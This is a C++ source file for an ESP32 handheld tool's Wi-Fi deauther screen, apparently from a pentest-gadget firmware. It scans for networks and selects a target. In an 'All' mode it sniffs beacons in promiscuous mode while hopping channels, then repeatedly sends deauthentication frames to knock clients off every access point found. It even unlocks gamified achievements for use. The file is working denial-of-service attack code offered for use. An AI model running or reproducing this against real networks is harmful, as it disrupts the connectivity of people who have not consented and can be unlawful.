#include "WifiDeautherScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/network/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// ── Static definitions ────────────────────────────────────────────────────

WifiDeautherScreen::ApEntry WifiDeautherScreen::_allTargets[MAX_ALL] = {};
int          WifiDeautherScreen::_allCount = 0;
portMUX_TYPE WifiDeautherScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;

// ── Destructor ────────────────────────────────────────────────────────────

WifiDeautherScreen::~WifiDeautherScreen()
{
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────

void WifiDeautherScreen::onInit()
{
  _state = STATE_MAIN;
  _showMain();
}

void WifiDeautherScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      if (index == 2) _startDeauth();
    } else {  // MODE_ALL
      if (index == 1) _startDeauth();
    }
  } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
    _target.ssid    = _scanLabels[index];
    _target.channel = atoi(_scanLabels[index] + 1);
    sscanf(_scanValues[index], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMain();
  }
}

void WifiDeautherScreen::onUpdate()
{
  if (_state != STATE_DEAUTHING) {
    ListScreen::onUpdate();
    return;
  }

  if (_state == STATE_DEAUTHING) {
    if (Uni.Nav->wasPressed()) {
      const auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        _stopDeauth();
        return;
      }
    }

    _spinIdx = (_spinIdx + 1) % 4;

    if (_mode == MODE_ALL) {
      _deauthAll();
      _statusMsg = String("[") + _spinner[_spinIdx] + "] Deauthing " + _allCount + " APs...";
    } else if (_attacker) {
      _attacker->deauthenticate(_target.bssid, _target.channel);
      _statusMsg = String("[") + _spinner[_spinIdx] + "] Deauthing " + _target.ssid + "...";
    }
    render();

    delay(100);
  }
}

void WifiDeautherScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI) {
    _showMain();
  } else if (_state == STATE_DEAUTHING) {
    _stopDeauth();
  } else {
    Screen.goBack();
  }
}

// ── Private ───────────────────────────────────────────────────────────────

void WifiDeautherScreen::onRender()
{
  if (_state == STATE_DEAUTHING) { _drawStatus(_statusMsg.c_str()); return; }
  ListScreen::onRender();
}

void WifiDeautherScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Target WiFi", _targetSub.c_str()};
    _mainItems[2] = {"Start Deauth"};
    setItems(_mainItems, 3);
  } else {
    _mainItems[1] = {"Start Deauth"};
    setItems(_mainItems, 2);
  }
}

void WifiDeautherScreen::_selectWifi()
{
  _state = STATE_SELECT_WIFI;
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  const int total = WiFi.scanNetworks();

  if (total == 0) {
    ShowStatusAction::show("No networks found");
    _showMain();
    return;
  }

  _scanCount = total > MAX_SCAN ? MAX_SCAN : total;
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "[%2d] %s",
             WiFi.channel(i), WiFi.SSID(i).c_str());
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    _scanItems[i] = {_scanLabels[i], _scanValues[i]};
  }

  setItems(_scanItems, _scanCount);
}

void WifiDeautherScreen::_startDeauth()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Select a target first!");
      return;
    }
  }

  _state       = STATE_DEAUTHING;
  _spinIdx     = 0;
  _chromeDrawn = false;

  int nd = Achievement.inc("wifi_deauth_first");
  if (nd == 1)  Achievement.unlock("wifi_deauth_first");
  if (nd == 10) Achievement.unlock("wifi_deauth_10");
  if (_mode == MODE_ALL) {
    int na = Achievement.inc("wifi_deauth_all_mode");
    if (na == 1) Achievement.unlock("wifi_deauth_all_mode");
  }

  _attacker = new WifiAttackUtil();

  if (_mode == MODE_ALL) {
    portENTER_CRITICAL(&_allLock);
    memset(_allTargets, 0, sizeof(_allTargets));
    _allCount = 0;
    portEXIT_CRITICAL(&_allLock);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiDeautherScreen::_beaconCb);
    _statusMsg = "[...] Scanning for APs...";
  } else {
    _statusMsg = "Deauthing " + _target.ssid + "...";
  }
  render();
}


void WifiDeautherScreen::_stopDeauth()
{
  if (_mode == MODE_ALL) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
  }
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _spinIdx     = 0;
  _allChanHop  = 0;
  _allCount    = 0;
  _statusMsg = "Deauth stopped.";
  render();
  delay(1000);
  _showMain();
}

void WifiDeautherScreen::_deauthAll()
{
  if (!_attacker) return;

  // Snapshot under lock so we don't block the beacon callback
  ApEntry local[MAX_ALL];
  int count;
  portENTER_CRITICAL(&_allLock);
  memcpy(local, _allTargets, sizeof(_allTargets));
  count = _allCount;
  portEXIT_CRITICAL(&_allLock);

  // Deauth all known APs (changes channel per AP internally)
  for (int i = 0; i < count; i++) {
    if (!local[i].valid) continue;
    _attacker->deauthenticate(local[i].bssid, local[i].channel);
  }

  // Hop to next scan channel AFTER deauth — dwell here until next call (~100ms)
  // so promiscuous callback can capture beacons on this channel
  _allChanHop = (_allChanHop % 13) + 1;
  _attacker->setChannel(_allChanHop);
}

void WifiDeautherScreen::_drawStatus(const char* msg)
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  sp.drawString(msg, bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Beacon callback ────────────────────────────────────────────────────────

void WifiDeautherScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || buf == nullptr) return;

  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const size_t   len = pkt->rx_ctrl.sig_len;

  if (len < 10) return;

  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
  if (fc_sub != 8) return;  // beacon only

  // BSSID is addr3 (offset 16) in beacon management frame
  if (len < 22) return;
  const uint8_t* bssid = pay + 16;
  const uint8_t  ch    = pkt->rx_ctrl.channel;

  portENTER_CRITICAL(&_allLock);

  // Check if already present
  for (int i = 0; i < _allCount; i++) {
    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
      _allTargets[i].channel = ch;  // update channel in case it changed
      portEXIT_CRITICAL(&_allLock);
      return;
    }
  }

  // Add new entry
  if (_allCount < MAX_ALL) {
    memcpy(_allTargets[_allCount].bssid, bssid, 6);
    _allTargets[_allCount].channel = ch;
    _allTargets[_allCount].valid   = true;
    _allCount++;
  }

  portEXIT_CRITICAL(&_allLock);
}